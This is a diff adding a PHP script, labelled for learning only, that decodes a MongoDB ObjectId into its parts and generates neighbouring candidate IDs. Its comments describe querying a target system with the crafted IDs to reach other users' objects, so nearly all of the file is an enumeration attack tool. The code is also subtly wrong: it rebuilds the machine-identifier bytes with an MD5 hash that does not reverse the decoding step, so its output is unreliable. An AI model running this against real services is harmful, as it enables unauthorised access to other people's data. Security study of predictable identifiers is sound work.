@@ -1,0 +1,82 @@
+<?php
+/* 
+
+- For Learning Purpose Only (MongoDB, Insecure Object Reference ID):
+
+   How Secure could be a MONGODB _id (12 Bytes) when used as ORI. 
+   
+   According to MongoDB DOCS:
+   ObjectId(<hexadecimal>)
+        Returns a new ObjectId value. The 12-byte ObjectId value consists of:
+
+        a 4-byte value representing the seconds since the Unix epoch,
+        a 3-byte machine identifier,
+        a 2-byte process id, and
+        a 3-byte counter, starting with a random value.
+
+
+   To Assess the Robustness of an ORI relying on MONGODB ID:
+   1 - Trigger the system to create a new MongoID for you. Record the MongoID X.
+   2 - Run the function ReversMongoDB (X); extract Timestamp, MachineID, ProcessID and BaseCounter
+   3 - Explore Timestamp vs BaseCounter to make new MongoDB IDs
+   4 - Query the System for new crafted MongoDB IDs.
+*/
+function ReverseMongoDB($mongoDBID){
+        
+        /* 4 Bytes EPOCH : This exactly suggests the exact Time that the ID has been generated. */
+        $epoch                 = substr($mongoDBID,0, 8);
+        $baseepoch             = hexdec($epoch);
+
+        /* 3 Bytes MachineID: This is unique to the Enviornment where MongoDB is being done. It can change only if the Host Instant changes. */
+        $machineIdentifier     = substr($mongoDBID,8, 6);
+        $basemachineIdentifier = hexdec($machineIdentifier);
+
+        /* 2 Bytes MongoDB ID: This is mostly a steady value as Long as the MongoDB Process has not been shutdown and rerunned since last time. */
+        $processId      = substr($mongoDBID,14, 4);
+        $baseprocessId  = hexdec($processId);
+
+        /* 3 Bytes Counter: This is a Random Number 2^24 Patterns. In practice the pick of Mongo of how randomness is respected can be questioned. */
+        $counter        = substr($mongoDBID,18, 6);
+        $basecounter    = hexdec($counter);
+
+        return(array("epoch"     => "$baseepoch",
+                     "machineID" => "$basemachineIdentifier",
+                     "processID" => "$baseprocessId",
+                     "counter"   => "$basecounter"));
+}
+
+function createMongoId($timestamp, $machineIdentifier, $processId, $counterid)
+{
+        /* Building binary data */
+        $bin = sprintf(
+                "%s%s%s%s",
+                pack('N', $timestamp),
+                substr(md5($machineIdentifier), 0, 3),
+                pack('n', $processId),
+                substr(pack('N', $counterid), 1, 3)
+        );
+        // Convert binary to hex.
+        $result = '';
+        for ($i = 0; $i < 12; $i++) {
+                $result .= sprintf("%02x", ord($bin[$i]));
+        }
+        return $result;
+}
+
+//START: 1479853000  (22 Nov 2016 22:16:40)
+$epochStartDate    =  1479853000;
+$epochEndDate      =  1479853007;
+$machineIdentifier =  15217314;
+$processId         =  2956;
+$counterStartID    =  7224100;
+$counterEndID      =  7224102;
+
+for($x= $epochStartDate; $x <= $epochEndDate; $x++) {
+        for ($y=$counterStartID; $y<$counterEndID; $y++){
+		$mobid = createMongoId($x,$machineIdentifier,$processId,$y);
+		echo $mobid;
+                echo "\n";
+                /*$myfile = file_put_contents('mongoids.txt', $mobid.PHP_EOL , FILE_APPEND | LOCK_EX);*/
+        }
+}
+
